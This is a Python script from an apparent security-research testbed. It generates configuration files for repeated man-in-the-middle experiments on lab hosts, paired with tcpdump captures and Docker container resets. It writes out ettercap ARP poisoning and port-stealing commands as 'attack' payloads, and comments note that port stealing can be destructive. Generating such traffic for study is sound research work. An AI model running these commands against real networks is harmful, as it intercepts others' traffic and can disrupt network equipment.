from capcon.payload import genPayload, GenericPayload, format_payloadIds_with_digest
import logging
from pathlib import Path

from rich import print as rprint

from capcon.log_payload import logging_payloads
from capcon.systemd_time import parse_systemd_timespan
from motra.common.capcon import write_capcon_to_file
from motra.common.capcon_protocol import CAPCON

# an example for ettercap skripting
# sudo ettercap -T -s 's(60)slqq' -M arp  -i end0 /10.10.10.102// /10.10.10.103//
# sudo ettercap -T -s 's(60)slqq' -M arp:oneway -i end0 /10.10.10.102// /10.10.10.103//
#
# da wir switched arbeiten, schicken die beiden TN keine Daten über den Router/Gateway:
# sudo ettercap -T -s 's(60)slqq' -M arp:remote -i end0 /10.10.10.102// /10.10.10.103//

# port stealing
# this one is possibly destructive on the router ....
# sudo ettercap -T -s 's(60)slqq' -M port -i end0 /10.10.10.103//

log = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, datefmt="%H:%M:%S")

# #############################################################################################

capcon_output_folder = Path(".") / "tmp-gen"
capcon_output_folder.resolve().mkdir(exist_ok=True)
log.info(capcon_output_folder)

mitm_payloads: list[GenericPayload] = []
mitm_payloads.append(
    genPayload(
        command="sudo ettercap -T -s 's(230)slqq' -M arp  -i end0 /{target_ip1}// /{target_ip2}//",
        target=["server"],
        description="ettercap arp 1:1 target",
        limits="231s",
        offset="500ms",
        payload_type="attack",
    )
)

mitm_payloads.append(
    genPayload(
        command="sudo ettercap -T -s 's(230)slqq' -M arp:oneway -i end0 /{target_ip1}// /{target_ip2}//",
        target=["server"],
        description="ettercap arp:oneway 1:1 target",
        limits="231s",
        offset="500ms",
        payload_type="attack",
    )
)


mitm_payloads.append(
    genPayload(
        command="sudo ettercap -T -s 's(230)slqq' -M port -i end0 /{target_ip1}//",
        target=["server"],
        description="ettercap portstealing",
        limits="231s",
        offset="500ms",
        payload_type="attack",
    )
)

# create a payload to reset the current testbed configuration
# this is required, in case the testbed crashes or we hit a timeout for the subscription services
config_payload = genPayload(
    command="docker compose -f /home/motra/plc.yaml restart",
    description="restart containers ... ",
    target=["client"],
    limits="30s",
    offset="200ms",
    payload_type="config",
)


# the network capture process is also a static payload.
# we try to generate pcaps for the baseline measurements and for the attacks
capture_payload = genPayload(
    command="timeout {tcpdump_runtime} sudo tcpdump -i enxa0cec88b1a4e -w {capconname}.pcap",
    target=["server"],
    description="archive current network interaction",
    limits="{tcpdump_runtime}s",
    offset="500ms",
    payload_type="capture",
)

# we can update these early
for p in mitm_payloads:
    p.command = p.command.format(target_ip1="10.10.10.103", target_ip2="10.10.10.102")


# create a list of default payloads
static_payloads: list[GenericPayload] = [item.model_copy() for item in logging_payloads]
static_payloads.append(capture_payload)

repetition = 10
dynamic_payloads = mitm_payloads[:]  # shallow copy
mitm_configurations: list[CAPCON] = []
id_count = 1

for dyn_payloads in dynamic_payloads:

    # run N measurements to get a good baseline
    for _ in range(0, repetition):

        nextCapConName = f"mitm_payload_testing{id_count:04}"

        # create a copy of static payload list and populate the names
        payload = [item.model_copy() for item in static_payloads]
        payload.append(dyn_payloads.model_copy())

        # the dyn. models are required to set the upper runtime limit
        # add 1s as margin, in case some payload uses a subsecond interval
        # this will just round up the runtime for the tcpdump process to the next full second
        upper_runtime = int(parse_systemd_timespan(dyn_payloads.limits))
        upper_runtime += 1

        # update all the runtime parameters (names, runtime in s)
        for load in payload:
            load.command = load.command.format(
                capconname=nextCapConName,
                tcpdump_runtime=str(upper_runtime),  # timeout ...
            )
            load.limits = load.limits.format(
                tcpdump_runtime=str(upper_runtime + 1),  # actual limit
            )

        # create a list of payloads and update payload IDs
        payload = format_payloadIds_with_digest(payload, nextCapConName)

        # we run the default configs for about one minute
        # this way we can inject the config samples easily
        newCon = CAPCON(
            CapConID=nextCapConName,
            duration=str(upper_runtime + 5) + "s",
            payload=payload,
            description=f"MITM attacks for {dyn_payloads.description}",
            timestamp_utc="",
        )

        mitm_configurations.append(newCon)
        id_count += 1

        # since the mitm attacks can be destructive, we will be adding a configuration reset every iteration
        confLoad = config_payload.model_copy()
        nextCapConName = nextCapConName + "_config"
        confLoad = format_payloadIds_with_digest([confLoad], nextCapConName)
        configCon = CAPCON(
            CapConID=nextCapConName,
            duration="35s",
            payload=confLoad,
            description="config reset for docker",
            timestamp_utc="",
        )
        mitm_configurations.append(configCon)


# print(len(capture_configurations))

# generate the base configuration
for capcon in mitm_configurations:
    # rprint(capcon)
    write_capcon_to_file(
        capcon_output_folder,
        capcon,
        capcon_name=capcon.CapConID + ".json",
        create_ID_file=False,
    )
